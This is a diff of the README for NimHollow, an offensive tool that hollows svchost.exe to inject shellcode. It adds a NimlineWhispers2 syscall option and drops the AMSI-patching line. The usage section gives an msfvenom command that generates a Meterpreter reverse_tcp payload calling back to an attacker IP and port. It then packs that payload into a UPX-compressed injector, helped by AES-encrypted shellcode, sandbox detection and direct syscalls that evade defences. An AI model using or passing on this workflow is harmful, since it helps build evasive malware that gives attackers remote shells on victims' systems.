@@ -5,10 +5,9 @@ Playing around with the [Process Hollowing](https://attack.mitre.org/techniques/
 
 Features:
 
-* Direct syscalls for triggering Windows Native API functions with [NimlineWhispers](https://github.com/ajpc500/NimlineWhispers).
+* Direct syscalls for triggering Windows Native API functions with [NimlineWhispers](https://github.com/ajpc500/NimlineWhispers) or [NimlineWhispers2](https://github.com/ajpc500/NimlineWhispers2).
 * Shellcode encryption/decryption with [AES in CTR mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)).
 * Simple sandbox detection methods from the OSEP course by @offensive-security.
-* AMSI patching with @rasta-mouse's [method](https://rastamouse.me/memory-patching-amsi-bypass/) is also inside (uncomment it for your needs).
 
 ## Usage
 
@@ -16,6 +15,7 @@ Installation:
 
 ```console
 ~$ git clone --recurse-submodules https://github.com/snovvcrash/NimHollow && cd NimHollow
+~$ git submodule update --init --recursive
 ~$ nimble install winim nimcrypto
 ~$ pip3 install -r requirements.txt
 ~$ sudo apt install upx -y
@@ -25,7 +25,7 @@ Example:
 
 ```console
 ~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.13.37 LPORT=31337 EXITFUNC=thread -f raw -o shellcode.bin
-~$ python3 NimHollow.py shellcode.bin -i 'C:\Windows\System32\svchost.exe' -o injector --upx --rm
+~$ python3 NimHollow.py shellcode.bin -i 'C:\Windows\System32\svchost.exe' -o injector --upx --rm [--whispers2]
 ~$ file injector.exe
 injector.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
 ~$ sudo msfconsole -qr msf.rc
@@ -34,7 +34,7 @@ injector.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for 
 Help:
 
 ```
-usage: NimHollow.py [-h] [-i IMAGE] [-o OUTPUT] [--debug] [--upx] [--rm] shellcode_bin
+usage: NimHollow.py [-h] [-i IMAGE] [-o OUTPUT] [--whispers2] [--debug] [--upx] [--rm] shellcode_bin
 
 positional arguments:
   shellcode_bin         path to the raw shellcode file
@@ -45,6 +45,7 @@ optional arguments:
                         process image to hollow (default "C:\Windows\System32\svchost.exe")
   -o OUTPUT, --output OUTPUT
                         output filename
+  --whispers2           use NimlineWhispers2 to generate syscalls.nim
   --debug               do not strip debug messages from Nim binary
   --upx                 compress Nim binary with upx
   --rm                  remove Nim files after compiling the binary
@@ -74,6 +75,6 @@ optional arguments:
 
 ## Credits
 
-* @ajpc500 for the [NimlineWhispers](https://github.com/ajpc500/NimlineWhispers) project.
+* @ajpc500 for the [NimlineWhispers](https://github.com/ajpc500/NimlineWhispers) and [NimlineWhispers2](https://github.com/ajpc500/NimlineWhispers2) projects.
 * @byt3bl33d3r for the [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim/) repository.
 * @S3cur3Th1sSh1t and @chvancooten for Nim [code](https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim) [snippets](https://github.com/byt3bl33d3r/OffensiveNim/issues/16).
